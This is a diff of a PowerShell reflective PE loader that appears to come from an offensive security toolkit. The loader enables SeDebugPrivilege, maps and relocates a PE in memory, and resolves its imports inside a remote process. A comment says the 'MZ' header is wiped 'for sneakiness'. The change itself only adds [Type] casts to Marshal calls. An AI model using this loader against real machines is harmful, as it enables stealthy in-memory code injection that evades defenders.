@@ -1046,18 +1046,18 @@ $RemoteScriptBlock = {
 			}
 		}
 		
-		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.LUID))
+		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
 		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
 		if ($Result -eq $false)
 		{
 			Throw "Unable to call LookupPrivilegeValue"
 		}
 
-		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.TOKEN_PRIVILEGES)
+		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
 		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
-		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, $Win32Types.TOKEN_PRIVILEGES)
+		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
 		$TokenPrivileges.PrivilegeCount = 1
-		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, $Win32Types.LUID)
+		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
 		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
 		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
 
@@ -1138,12 +1138,12 @@ $RemoteScriptBlock = {
 		$NtHeadersInfo = New-Object System.Object
 		
 		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
-		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, $Win32Types.IMAGE_DOS_HEADER)
+		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
 
 		#Get IMAGE_NT_HEADERS
 		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
 		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
-		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS64)
+		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
 		
 		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
 	    if ($imageNtHeaders64.Signature -ne 0x00004550)
@@ -1158,7 +1158,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS32)
+			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
 		}
@@ -1240,12 +1240,12 @@ $RemoteScriptBlock = {
 		
 		if ($PEInfo.PE64Bit -eq $true)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS64)))
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
 			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
 		}
 		else
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS32)))
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
 			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
 		}
 		
@@ -1278,7 +1278,7 @@ $RemoteScriptBlock = {
 		$ImportDllPathPtr
 		)
 		
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		
 		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
 		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
@@ -1368,7 +1368,7 @@ $RemoteScriptBlock = {
 			{
 				Throw "Call to ReadProcessMemory failed"
 			}
-			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [IntPtr])
+			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
 			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
@@ -1414,7 +1414,7 @@ $RemoteScriptBlock = {
 		$FunctionName
 		)
 
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
 		
 		#Write FunctionName to memory (will be used in GetProcAddress)
@@ -1519,7 +1519,7 @@ $RemoteScriptBlock = {
 		{
 			Throw "Call to ReadProcessMemory failed"
 		}
-		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [IntPtr])
+		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
 		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
@@ -1551,8 +1551,8 @@ $RemoteScriptBlock = {
 		
 		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
-			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, $Win32Types.IMAGE_SECTION_HEADER)
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
+			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
 		
 			#Address to copy the section to
 			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
@@ -1613,7 +1613,7 @@ $RemoteScriptBlock = {
 		
 		[Int64]$BaseDifference = 0
 		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
-		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_BASE_RELOCATION)
+		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
 		
 		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
 		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
@@ -1638,7 +1638,7 @@ $RemoteScriptBlock = {
 		while($true)
 		{
 			#If SizeOfBlock == 0, we are done
-			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, $Win32Types.IMAGE_BASE_RELOCATION)
+			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
 
 			if ($BaseRelocationTable.SizeOfBlock -eq 0)
 			{
@@ -1653,7 +1653,7 @@ $RemoteScriptBlock = {
 			{
 				#Get info for this relocation
 				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
-				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [UInt16])
+				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
 
 				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
 				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
@@ -1671,7 +1671,7 @@ $RemoteScriptBlock = {
 				{			
 					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
 					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
-					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [IntPtr])
+					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
 		
 					if ($AddDifference -eq $true)
 					{
@@ -1732,7 +1732,7 @@ $RemoteScriptBlock = {
 			
 			while ($true)
 			{
-				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, $Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 				
 				#If the structure is null, it signals that this is the end of the array
 				if ($ImportDescriptor.Characteristics -eq 0 `
@@ -1766,7 +1766,7 @@ $RemoteScriptBlock = {
 				#Get the first thunk, then loop through all of them
 				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
 				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
-				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [IntPtr])
+				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 				
 				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
 				{
@@ -1782,7 +1782,7 @@ $RemoteScriptBlock = {
 					else
 					{
 						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
-						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([UInt16]))
+						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
 						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
 					}
 					
@@ -1802,12 +1802,12 @@ $RemoteScriptBlock = {
 
 					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
 					
-					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]))
-					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]))
-					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [IntPtr])
+					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 				}
 				
-				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
 			}
 		}
 	}
@@ -1902,8 +1902,8 @@ $RemoteScriptBlock = {
 		
 		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
-			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, $Win32Types.IMAGE_SECTION_HEADER)
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
+			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
 			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
 			
 			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
@@ -1948,7 +1948,7 @@ $RemoteScriptBlock = {
 		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
 		$ReturnArray = @() 
 		
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		[UInt32]$OldProtectFlag = 0
 		
 		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
@@ -2058,8 +2058,8 @@ $RemoteScriptBlock = {
 				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
 				
 				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
-				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [IntPtr])
-				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [IntPtr])
+				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
+				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
 				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
@@ -2227,23 +2227,23 @@ $RemoteScriptBlock = {
 			return [IntPtr]::Zero
 		}
 		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
-		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, $Win32Types.IMAGE_EXPORT_DIRECTORY)
+		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
 		
 		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
 		{
 			#AddressOfNames is an array of pointers to strings of the names of the functions exported
-			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
-			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [UInt32]))
+			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
 			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
 
 			if ($Name -ceq $FunctionName)
 			{
 				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
 				#    which contains the offset of the function in to the DLL
-				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt16])))
-				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [UInt16])
-				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
-				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [UInt32])
+				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
+				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
+				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
+				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
 				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
 			}
 		}
@@ -2268,7 +2268,7 @@ $RemoteScriptBlock = {
 		$RemoteProcHandle
 		)
 		
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		
 		#Get Win32 constants and functions
 		$Win32Constants = Get-Win32Constants
@@ -2311,14 +2311,14 @@ $RemoteScriptBlock = {
 				Throw "Call to IsWow64Process failed"
 			}
 			
-			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -eq 4)))
+			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
 			{
 				$Process64Bit = $false
 			}
 			
 			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
 			$PowerShell64Bit = $true
-			if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -ne 8)
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
 			{
 				$PowerShell64Bit = $false
 			}
@@ -2329,7 +2329,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -ne 8)
+			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
 			{
 				$Process64Bit = $false
 			}
@@ -2569,7 +2569,7 @@ $RemoteScriptBlock = {
 			
 			while ($true)
 			{
-				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, $Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 				
 				#If the structure is null, it signals that this is the end of the array
 				if ($ImportDescriptor.Characteristics -eq 0 `
@@ -2596,7 +2596,7 @@ $RemoteScriptBlock = {
 					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
 				}
 				
-				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
 			}
 		}
 		
